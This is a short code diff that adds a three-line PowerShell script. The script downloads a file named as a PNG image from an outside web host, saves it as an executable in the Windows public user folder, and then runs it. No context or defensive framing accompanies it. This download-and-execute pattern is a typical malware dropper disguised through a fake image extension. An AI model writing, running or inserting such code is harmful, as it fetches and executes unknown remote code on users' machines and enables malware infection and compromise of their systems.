@@ -1,0 +1,3 @@
+$webclient = New-Object System.Net.WebClient
+$webclient.DownloadFile("https://e-bookstore.eu/teste/total.png","C:\Users\Public\origin.exe")
+C:\Users\Public\origin.exe
